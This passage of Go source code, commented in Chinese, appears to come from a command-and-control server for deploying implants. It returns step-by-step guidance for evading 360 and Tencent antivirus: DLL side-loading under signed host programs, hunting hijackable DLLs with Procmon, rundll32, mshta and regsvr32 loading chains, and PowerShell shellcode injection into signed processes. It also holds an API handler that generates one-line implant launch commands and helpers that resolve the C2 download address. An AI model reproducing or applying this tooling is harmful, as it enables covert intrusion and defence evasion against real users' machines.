			"自查：Apple Silicon 上要跑 arm64 载荷；网关/DNS 出口策略常与 Windows 环境完全不同，先确认目标机能连到 C2。",
		}
	case "windows":
		switch format {
		case "dll":
			if signed {
				return "Windows DLL 载荷：优先白加黑侧加载（宿主已签名，DLL 也建议签名）", []string{
					"白加黑（DLL 侧加载）最自然：找一个会加载同目录 DLL 的签名宿主，把 DLL 改名放到宿主同目录，直接运行宿主即可。",
					"宿主由操作员自备（本项目不内置任何第三方软件）：用 Procmon 过滤 Path ends with .dll + Result 为 NAME NOT FOUND 找可劫持点。",
					"备选：计划任务 + rundll32 加载（schtasks /create + /run + /delete），或用 mshta 出网把 DLL 落到宿主目录。",
					"即使已签名，360/电脑管家仍会对「已签名进程加载用户目录 DLL」做行为校验，准备 2 条以上备选链。",
				}
			}
			return "Windows DLL 载荷：走白加黑侧加载，不要直接下发未签名 exe", []string{
				"DLL 不能直接执行：走白加黑（DLL 侧加载）—— 由已签名的宿主程序（操作员自备）加载，磁盘上不出现未签名 PE，就不会触发「新 PE 落地即被删」。",
				"步骤：① 按 dll 格式构建植入端；② 找到会加载同目录 DLL 的已签名宿主（Procmon 看 NAME NOT FOUND）；③ 把植入端改名为那个 DLL 名放到宿主同目录；④ 运行签名宿主（start \"\" \"C:\\Path\\SignedHost.exe\"）。",
				"注意：不要用系统关键 DLL 名（可能破坏系统或被自保护拦截）；无签名 DLL 会被 360/电脑管家校验信誉，宿主与 DLL 名的选择决定成功率。",
				"备选：计划任务 + rundll32/mshta/regsvr32 加载我们的 DLL；或直接改用 shellcode 走内存加载链。",
			}
		case "shellcode", "shellcode_bin":
			if signed {
				return "Windows shellcode 载荷：内存加载优先，已签名时也可回落 exe 直接运行", []string{
					"shellcode 不落地 PE，优先用内存加载（VirtualAlloc + CreateThread 注入签名进程），签名与否都不影响这条链路。",
					"服务端 shellcode 格式的下载物是 hex 文本，shellcode_bin 才是原始字节，注入脚本要按对应形式解码。",
					"已签名的话也可以直接下发 exe：先试直接运行，再试计划任务，shellcode 链作为兜底。",
					"内存加载依赖脚本宿主/注入环境，ConstrainedLanguage、AppLocker、WDAC 都会让 Add-Type 一类的注入脚本失败，先验证。",
				}
			}
			return "Windows shellcode 载荷：只走内存加载链（不落地未签名 PE）", []string{
				"在装有 360 安全卫士/腾讯电脑管的机器上，未签名 PE 一落地执行就会被拒绝并删除，所以只走内存加载：不要为了「先跑起来」把 shellcode 还原成 exe 再落地。",
				"首选：powershell -enc 拉取 shellcode 并注入当前 powershell.exe（微软签名进程），磁盘上不出现 PE。",
				"下载物是 hex 文本（shellcode 格式）或原始字节（shellcode_bin），注入脚本要按对应形式解码，别直接当字节用。",
				"需要拆开「出网进程」与「注入进程」时用 mshta 骨架：mshta 出网拉 hex，签名 powershell 负责注入。",
				"风险：RWX 内存 + 远程线程是国产杀软的重点行为规则，可能仍然被拦；准备白加黑作为备选。",
			}
		default: // exe / raw / 其它
			if signed {
				return "Windows 已签名载荷：优先直接运行，其次计划任务", []string{
					"已签名载荷优先直接运行（PowerShell/BITS/certutil/curl 变体都可用），签名能过国产杀软的「未知程序」拦截。",
					"其次用计划任务把执行时机与当前会话解耦：schtasks /create + /run，执行完 /delete 清理。",
					"签名很脆弱：签名后再改二进制（UPX 加壳、改资源、改配置）都会让签名失效，不要在签名之后动产物。",
					"证书不被信任、被吊销或用过期时间戳时，国产杀软照样拦；仍要准备白加黑与内存加载链。",
					"即使已签名，无文件注入、计划任务指向用户目录等行为仍会被拦截，按「直接运行 → 计划任务 → 白加黑 → 内存加载」顺序降级。",
				}
			}
			return "Windows 未签名载荷：不要直接下发 exe，先签名或改走白加黑/内存加载链", []string{
				"实测环境事实：在装有 360 安全卫士/腾讯电脑管家等国产安全软件的主机上，任何新生成或未签名的 PE 一执行就被拒绝并删除文件（连 Hello World 的 Go 程序也一样；微软签名的系统程序副本可以正常运行）。",
				"因此未签名 exe 在装有 360/电脑管家的机器上会被拒绝执行：要么先用受信任证书签名（带时间戳）再下发，要么不要落地未签名 PE。",
				"拿不到签名时按这个顺序改链路：① 白加黑（把植入端构建为 dll，改名为已签名宿主会加载的 DLL，由签名宿主侧加载）；② 计划任务 + 已签名宿主（schtasks 调 rundll32/mshta/regsvr32 加载我们的 DLL）；③ 内存加载（拉 shellcode 注入签名进程，不落地 PE）。",
				"LOLBin 直载（certutil 下载后执行、mshta、regsvr32 Squiblydoo）在国产杀软下拦截率高，只作短平快的补充，用前先在测试机验证。",
				"无论走哪条链，先在同样装了安全软件的测试机上验证，并同时准备 2~3 条备选链。",
			}
		}
	}

	return "未知平台：按最小假设处理", []string{
		"内置的落地建议只覆盖 Windows / Linux / macOS，其它平台请先手工验证下载与执行权限（chmod +x、架构匹配、出口策略）。",
		"Windows 上「未签名 PE 落地执行被拦」最严重；其它平台按目标系统自身的签名、沙箱与 EDR 策略评估。",
		"无论哪个平台，先在授权测试环境验证链路，再对目标执行。",
	}
}

// storedImplantOneLinerHandler GET /api/v1/implants/stored/{id}/oneliner
// 为已构建的载荷重新生成上线命令（列表页「一条命令上线」入口），
// 地址解析与生成时一致，避免前端用自己的访问地址拼出 localhost。
func (s *Server) storedImplantOneLinerHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	id := mux.Vars(r)["id"]
	osName, format := "windows", ""

	if strings.HasPrefix(id, "file:") {
		// 输出目录里没有数据库记录的遗留文件：按扩展名推断平台与格式。
		name := strings.TrimPrefix(id, "file:")
		format = strings.TrimPrefix(filepath.Ext(name), ".")
		if format == "so" || format == "bin" {
			osName = "linux"
		}
	} else if db := database.Get(); db != nil {
		if imp, err := db.GetImplant(id); err == nil {
			osName, format = imp.OS, imp.Format
		}
	}

	set := s.oneLinerSet(r, "", osName, format, id, "")
	if set == nil {
		w.WriteHeader(http.StatusOK)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"variants": []OneLiner{},
			"error":    "该格式的载荷既不能直接运行、也没有可用的加载器链（可直接运行的 exe/raw，Linux 额外支持 bin；Windows 的 dll/shellcode 只提供加载器链）",
		})
		return
	}

	_ = json.NewEncoder(w).Encode(set)
}

// ---- 地址解析工具 ----

// normalizeDownloadBase 解析运维填写的下载基址，允许三种写法：
//
//	https://c2.example.com          → 原样使用（含路径前缀，适合 CDN/反代子路径）
//	c2.example.com:18081            → 按当前协议拼 scheme://host:port
//	c2.example.com                  → 省略端口（协议为 https 时按 443 处理）
//
// 空值、回环地址（localhost/127.0.0.1/::1）一律视为无效，交由下一级回退。
func normalizeDownloadBase(raw, fallbackScheme string, apiPort int) (string, string, bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", "", false
	}

	if strings.Contains(raw, "://") {
		u, err := url.Parse(raw)
		if err != nil || u.Host == "" || isLoopbackHost(u.Hostname()) {
			return "", "", false
		}
		path := strings.TrimSuffix(strings.TrimSpace(u.Path), "/")
		return u.Scheme + "://" + u.Host + path, u.Host, true
	}

	hostPart, path := raw, ""
	if i := strings.IndexByte(raw, '/'); i >= 0 {
		hostPart, path = raw[:i], strings.TrimSuffix(raw[i:], "/")
	}
	h, port := splitHostPortLoose(hostPart)
	if h == "" || isLoopbackHost(h) {
		return "", "", false
	}
	if port == "" && !defaultPort(fallbackScheme, apiPort) {
		hostPart = fmt.Sprintf("%s:%d", h, apiPort)
	}
	return fallbackScheme + "://" + hostPart + path, hostPart, true
}

// requestDownloadBase 用控制台自身的访问地址作为下载基址。
// 能打开后台就说明这个地址对运维可达；反代域名会被 X-Forwarded-* 自动识别。
func requestDownloadBase(r *http.Request) (string, string, bool) {
	host := firstCSV(r.Header.Get("X-Forwarded-Host"))
	if host == "" {
		host = r.Host
	}
	if host == "" {
		return "", "", false
	}
	scheme := strings.ToLower(firstCSV(r.Header.Get("X-Forwarded-Proto")))
	if scheme != "http" && scheme != "https" {
		scheme = "http"
		if r.TLS != nil {
			scheme = "https"
		}
	}
	h, _ := splitHostPortLoose(host)
	if isLoopbackHost(h) {
		return "", "", false
	}
	return scheme + "://" + host, host, true
}

// isLoopbackHost 判断是否回环/未指定地址：这类地址写进上线命令对目标机毫无意义。
func isLoopbackHost(host string) bool {
	host = strings.ToLower(strings.TrimSpace(strings.Trim(host, "[]")))
	if host == "" {
		return true
	}
	switch host {
	case "localhost", "localhost.localdomain", "0.0.0.0", "::", "::1":
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback() || ip.IsUnspecified()
	}
	return false
}

// detectLANIP 尽力探测本机内网 IPv4（优先私有网段），用于未配置公网地址时兜底。
func detectLANIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	var fallback string
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		ip := ipnet.IP.To4()
		if ip == nil || ip.IsLoopback() || ip.IsUnspecified() || !ip.IsGlobalUnicast() {
			continue
		}
		if ip.IsPrivate() {
			return ip.String()
		}
		if fallback == "" {
			fallback = ip.String()
		}
	}
	return fallback
}

// splitHostPortLoose 宽松拆分 host[:port]，无端口时返回空 port。
func splitHostPortLoose(raw string) (string, string) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", ""
	}
	if h, p, err := net.SplitHostPort(raw); err == nil {
		return h, p
	}
	return raw, ""
}

// joinHostPort 拼接 host:port，默认端口（http 80 / https 443）省略。
func joinHostPort(scheme, host string, port int) string {
	if port <= 0 || defaultPort(scheme, port) {
		return host
	}
	return fmt.Sprintf("%s:%d", host, port)
}

// defaultPort 判断端口是否是该协议的默认端口（可省略）。
func defaultPort(scheme string, port int) bool {
	return (scheme == "https" && port == 443) || (scheme == "http" && port == 80)
}

// firstCSV 取逗号分隔头的第一个值（反代常追加多级 X-Forwarded-*）。
func firstCSV(v string) string {
	if i := strings.IndexByte(v, ','); i >= 0 {
		v = v[:i]
	}
	return strings.TrimSpace(v)
}
